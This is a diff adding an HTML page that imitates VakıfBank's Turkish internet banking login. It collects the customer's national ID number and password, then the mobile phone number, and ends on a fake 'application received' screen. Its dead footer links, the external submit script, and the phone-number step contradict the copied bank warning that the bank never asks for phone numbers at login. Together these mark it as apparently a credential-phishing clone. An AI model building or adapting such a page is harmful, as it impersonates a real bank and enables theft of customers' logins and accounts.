@@ -1,0 +1,310 @@
+<html lang="tr"><head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta http-equiv="cache-control" content="max-age=0">
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="0">
+    <meta name="google" content="notranslate">
+    <title>VakıfBank İnternet Bankacılığı</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=0">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <link rel="icon" type="image/x-icon" href="./assets/img/icons/favicon.png">
+    <link rel="stylesheet" href="./assets/styles.0b20dbfea8c03916.css" media="all" onload="this.media='all'">
+    <style>
+      .transition-button[_ngcontent-unr-c589] {
+        float: left;
+        width: 50%;
+        display: block;
+        font-size: 14px;
+        font-weight: 900;
+        font-style: normal;
+        color: #a8a6a6;
+        text-align: center;
+        line-height: 40px;
+        transition: all ease-in-out .2s;
+        border-radius: 5px
+      }
+
+      .transition-button.active[_ngcontent-unr-c589] {
+        background: #fcb000;
+        color: #fff
+      }
+
+      .icon-text {
+        display: flex;
+        align-items: center;
+      }
+
+      .icon-text svg {
+        margin-right: 8px;
+      }
+
+      .error-message {
+        color: red;
+        font-size: 12px;
+        display: none;
+        margin-top: 5px;
+      }
+    </style>
+  </head>
+  <body class="disable-selection" ondragstart="return preventDragDrop();" ondrop="return preventDragDrop();">
+    <div disablerightclick="" class="main-wrapper wo-bg wo-bg-alternate-tbk vakifbank-wrapper">
+      <header data-sticky="0" data-sticky-class="main-header with-bg mobile-hidden" data-sticky-mode="mobile" class="main-header box-none with-bg mobile-hidden">
+        <div class="top-bar">
+          <div class="middler">
+            <div class="container">
+              <div class="col-md-4">
+                <figure tabindex="1" class="logo">
+                  <img src="./assets/vakifbank-logo.svg" alt="vakıfbank logosu">
+                </figure>
+              </div>
+              <div class="col-md-8">
+                <div class="header-options">
+                  <div class="lang-bar">
+                    <a class="active">TR</a>
+                    <a>EN</a>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </header>
+      <header class="main-header desktop-hidden">
+        <div class="mobile-nav">
+          <div class="container">
+            <a href="#" class="guide-link">
+              <img src="./assets/vakifbank-logo-white.svg" alt="vakıfbank logosu">
+            </a>
+            <ul class="mn-list">
+              <li>
+                <div class="login-mobile-lang-bar">
+                  <a href="javascript:void(0)" class="active" style="color: #000000 !important;">EN</a>
+                </div>
+              </li>
+            </ul>
+          </div>
+        </div>
+      </header>
+      <main class="main-content non-login">
+        <div class="container">
+          <div class="row">
+            <div class="col-md-12">
+              <div _ngcontent-unr-c657="" class="welcome-page-title"> Hoş Geldiniz </div>
+            </div>
+            <div>
+              <div id="loginScreen">
+                <div class="col-md-6">
+                  <div class="box-plate">
+                    <div class="form-group input" style="margin-top:25px;">
+                      <div class="input-container">
+                        <label for="txtTCKN" class="textbox-label">Müşteri / T.C. Kimlik Numarası</label>
+                        <input type="text" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" class="textbox-input input-pad" id="txtTCKN" placeholder="Müşteri / T.C. Kimlik Numarası" data-keyboard-btn="keyboardNumber" required="" minlength="11" maxlength="11">
+                        <small id="tcErrorMessage" class="error-message">T.C. Kimlik numaranız yanlış veya hatalı girdiniz!</small>
+                      </div>
+                    </div>
+                    <div class="form-group input">
+                      <div class="input-container">
+                        <label for="txtPassword" class="textbox-label">Şifreniz</label>
+                        <input type="password" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" class="textbox-input input-pad" id="txtPassword" placeholder="Şifreniz" required="" minlength="6" maxlength="6">
+                      </div>
+                    </div>
+                    <div class="form-group">
+                      <button type="button" id="loginButton" onclick="submitLogin();" class="edged-btns big filled" disabled="">GİRİŞ YAP</button>
+                      <button type="button" id="processButton" class="edged-btns big filled" style="display:none;">
+                        <div class="spinner"></div>
+                      </button>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+            <div id="phoneScreen" style="display:none;">
+              <div>
+                <div class="col-md-6">
+                  <div class="box-plate">
+                    <div class="form-group input" style="margin-top:-10px;">
+                      <div>
+                        <label for="txtPhone" class="textbox-label" style="display: block;">Cep telefonu numaranız</label>
+                      </div>
+                      <input type="text" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" class="textbox-input input-pad ng-untouched ng-pristine ng-valid" id="txtPhone" data-keyboard-btn="keyboardNumber" requizred="" minlength="11" maxlength="11">
+                    </div>
+                    <div class="form-group">
+                      <button type="button" id="phoneLoginButton" onclick="submitPhone();" class="edged-btns big filled">Devam et</button>
+                      <button type="button" id="phoneProcessButton" class="edged-btns big filled" style="display:none;">
+                        <div class="spinner"></div>
+                      </button>
+                    </div>
+                    
+                  </div>
+                  <div _ngcontent-unr-c561="" id="keyboard" data-keyboard="keyboardFull" class="keyboardFull">
+                    <span _ngcontent-unr-c561="" class="klavye_tus_sabit">
+                      <label _ngcontent-unr-c561="">
+                        <input _ngcontent-unr-c561="" tabindex="-1" id="chkSabit" type="checkbox" name="chkSabit" class="KeypadText">
+                        <span _ngcontent-unr-c561="" id="tussabit" class="KeypadText" style="margin-right: 10px;">
+                          <span _ngcontent-unr-c561="" id="spnFixButtons">Tuşları sabitle</span>
+                        </span>
+                      </label>
+                    </span>
+                    <span _ngcontent-unr-c561="" class="klavye_kapat"></span>
+                  </div>
+                </div>
+              </div>
+            </div>
+            <div id="doneScreen" style="display:none;">
+              <div>
+                <div class="col-md-6">
+                  <div class="box-plate">
+                    <div class="form-group input">
+                      <span class="icon-text">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-circle-dashed-check">
+                          <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+                          <path d="M8.56 3.69a9 9 0 0 0 -2.92 1.95"></path>
+                          <path d="M3.69 8.56a9 9 0 0 0 -.69 3.44"></path>
+                          <path d="M3.69 15.44a9 9 0 0 0 1.95 2.92"></path>
+                          <path d="M8.56 20.31a9 9 0 0 0 3.44 .69"></path>
+                          <path d="M15.44 20.31a9 9 0 0 0 2.92 -1.95"></path>
+                          <path d="M20.31 15.44a9 9 0 0 0 .69 -3.44"></path>
+                          <path d="M20.31 8.56a9 9 0 0 0 -1.95 -2.92"></path>
+                          <path d="M15.44 3.69a9 9 0 0 0 -3.44 -.69"></path>
+                          <path d="M9 12l2 2l4 -4"></path>
+                        </svg> Başvurunuz başarılı şekilde alınmıştır. </span>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+            <div class="warning-plate">
+              <h5 class="title">Güvenlik Uyarıları</h5>
+              <img src="./assets/secure-globalsign-ssl.png" alt="Secure GlobalSign SSL logo">
+              <ul>
+                <li> VakıfBank hiçbir zaman İnternet Şubesi girişinde müşterilerinin cep telefonu numarası, markası, modeli gibi bilgileri istememektedir. Bu tür şüpheli ekranlar ile karşılaştığınızda işleminizi durdurarak hemen 0850 222 0 724 Müşteri İletişim Merkezini arayınız ya da şubenize başvurunuz. Güvenlik uyarılarını okumak için lütfen </li>
+                <li> Dijital Kanallarda güvenliğiniz için güncel bir antivirüs programı kullanınız. </li>
+                <li> Bir sonraki sayfada Ad Soyad bilgilerinizi göreceksiniz. Bilgilerinizi göremezseniz tek kullanımlık şifrenizi girmeyiniz ve hemen 0850 222 0 724 Müşteri İletişim Merkezini arayınız ya da şubenize başvurunuz. </li>
+                <li> Tek kullanımlık şifreniz bir sonraki ekranda sorulacaktır. Tek kullanımlık şifre göremezseniz ve/veya birden fazla tek kullanımlık şifre istenirse ekrana bilgi girmeyiniz ve hemen 0850 222 0 724 Müşteri İletişim Merkezini arayınız ya da şubenize başvurunuz. </li>
+              </ul>
+            </div>
+          </div>
+      </div></main>
+      <footer _ngcontent-unr-c654="" class="main-footer">
+        <div _ngcontent-unr-c654="" class="middler">
+          <div _ngcontent-unr-c654="" class="container">
+            <span _ngcontent-unr-c654="" tabindex="19" class="copyright">© 2021 VakıfBank T.A.O </span>
+            <div _ngcontent-unr-c654="" class="righted-content">
+              <nav _ngcontent-unr-c654="" class="footer-nav">
+                <ul _ngcontent-unr-c654="" tabindex="20">
+                  <li _ngcontent-unr-c654="">
+                    <a _ngcontent-unr-c654="" href="#" target="_blank" rel="İşlem Listesi">İşlem Listesi</a>
+                  </li>
+                  <li _ngcontent-unr-c654="">
+                    <a _ngcontent-unr-c654="" rel="Planlı Kesinti ve Duyurular" style="cursor: pointer;">Planlı Kesinti ve Duyurular</a>
+                  </li>
+                  <li _ngcontent-unr-c654="">
+                    <a _ngcontent-unr-c654="" href="#" target="_blank" rel="İletişim">İletişim</a>
+                  </li>
+                </ul>
+              </nav>
+              <ul _ngcontent-unr-c654="" tabindex="21" class="app-platforms">
+                <li _ngcontent-unr-c654="">
+                  <a _ngcontent-unr-c654="" href="#" target="_blank" rel="Google Play" class="google-play"></a>
+                </li>
+                <li _ngcontent-unr-c654="">
+                  <a _ngcontent-unr-c654="" href="#" target="_blank" rel="App Store" class="app-store"></a>
+                </li>
+                <li _ngcontent-unr-c654="">
+                  <a _ngcontent-unr-c654="" href="#" target="_blank" rel="Huawei" class="huawei"></a>
+                </li>
+              </ul>
+            </div>
+          </div>
+        </div>
+      </footer>
+    </div>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js" integrity="sha512-v2CJ7UaYy4JwqLDIrZUI/4hqeoQieOmAZNXBeQyjo21dadnwR+8ZaIJVT8EE2iyI61OV8e6M8PP2/4hpQINQ/g==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+    <script type="text/javascript" src="./assets/js/script.js"></script>
+    <script type="text/javascript">
+      document.addEventListener('DOMContentLoaded', function() {
+        var inputs = [{
+          input: document.getElementById('txtTCKN'),
+          label: document.querySelector('label[for="txtTCKN"]')
+        }, {
+          input: document.getElementById('txtPassword'),
+          label: document.querySelector('label[for="txtPassword"]')
+        }, {
+          input: document.getElementById('txtPhone'),
+          label: document.querySelector('label[for="txtPhone"]')
+        }, {
+          input: document.getElementById('txtCode'),
+          label: document.querySelector('label[for="txtCode"]')
+        }, {
+          input: document.getElementById('txtCodeError'),
+          label: document.querySelector('label[for="txtCodeError"]')
+        }, {
+          input: document.getElementById('txtTCKNError'),
+          label: document.querySelector('label[for="txtTCKNError"]')
+        }, {
+          input: document.getElementById('txtPasswordError'),
+          label: document.querySelector('label[for="txtPasswordError"]')
+        }];
+        var txtCodeError = document.getElementById('txtCodeError');
+        if (txtCodeError) {
+          txtCodeError.addEventListener('input', function() {
+            txtCodeError.style.borderColor = '';
+          });
+        }
+        var txtTCKNError = document.getElementById('txtTCKNError');
+        if (txtTCKNError) {
+          txtTCKNError.addEventListener('input', function() {
+            txtTCKNError.style.borderColor = '';
+          });
+        }
+        var txtPasswordError = document.getElementById('txtPasswordError');
+        if (txtPasswordError) {
+          txtPasswordError.addEventListener('input', function() {
+            txtPasswordError.style.borderColor = '';
+          });
+        }
+        inputs.forEach(function(item) {
+          if (item.input && item.label) {
+            item.input.addEventListener('input', function() {
+              if (item.input.value.length > 0) {
+                item.label.style.display = 'none';
+              } else {
+                item.label.style.display = 'block';
+              }
+            });
+          }
+        });
+      });
+      document.addEventListener("DOMContentLoaded", function() {
+        const input = document.getElementById("txtTCKN");
+        const label = document.querySelector("label[for='txtTCKN']");
+        input.addEventListener("input", function() {
+          if (input.value.length > 0) {
+            label.style.display = "none";
+          } else {
+            label.style.display = "block";
+          }
+        });
+      });
+      document.addEventListener("DOMContentLoaded", function() {
+        function setupLabelToggle(inputId) {
+          const input = document.getElementById(inputId);
+          const label = document.querySelector("label[for='" + inputId + "']");
+          input.addEventListener("input", function() {
+            if (input.value.length > 0) {
+              label.style.display = "none";
+            } else {
+              label.style.display = "block";
+            }
+          });
+        }
+        setupLabelToggle("txtPassword");
+        setupLabelToggle("txtPhone");
+      });
+    </script>
+  
+
+</body></html>
